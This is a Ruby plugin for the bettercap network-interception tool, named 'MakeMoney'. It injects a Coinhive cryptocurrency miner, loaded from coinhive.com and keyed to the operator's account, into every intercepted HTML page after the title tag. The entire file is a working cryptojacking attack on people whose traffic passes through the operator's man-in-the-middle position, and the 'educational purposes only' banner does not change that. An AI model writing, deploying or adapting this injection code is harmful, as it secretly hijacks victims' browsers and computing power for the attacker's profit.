=begin

BETTERCAP

Author : hihebark

This project is released under the GPL 3 license.
   /**************************************************/
   /* THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* /
   /* IT IS PROVIDED "AS IS" AND WITHOUT ANY WARRANTY /
   /**************************************************/
=end
class Makemoney < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'MakeMoney',
    'Description' => 'Making money with bettercap using coinhive.',
    'Version'     => '0.0.1',
    'Author'      => "hihebark",
    'License'     => 'GPL3'
  )
  @@coinkey = nil #our argument to pass < required

  def self.on_options(opts)
    opts.on( '--coin-key KEY', 'Your site key on coinhive.' ) do |v|
      @@coinkey = v #initialize vcoinkey to v the passed key.
    end
  end
  
  def initialize
    raise BetterCap::Error, "No --coin-key option specified for the proxy module." if @@coinkey.nil? #print error whene no --coin-key found
    @loadcoinhive = "<script src='https://coinhive.com/lib/coinhive.min.js'></script>"
    @jscontent = "<script> var miner = new CoinHive.Anonymous('#{@@coinkey}'); miner.start(); </script>"
    @jsfile = "#{@loadcoinhive}#{@jscontent}" #our js to inject
  end
  
  def on_request( request, response )
    # is it a html page? if so remplace it with </title> with </title>#{@jsfile} < jsfile is our js to inject
    if response.content_type =~ /^text\/html.*/
      BetterCap::Logger.warn "Injecting coinhive into http://#{request.host}#{request.path}"
      response.body.sub!( '</title>', "</title>#{@jsfile}" )
      BetterCap::Logger.info "Start mining"
      #BetterCap::Logger.info "#{@jsfile}"
    end
  end
end
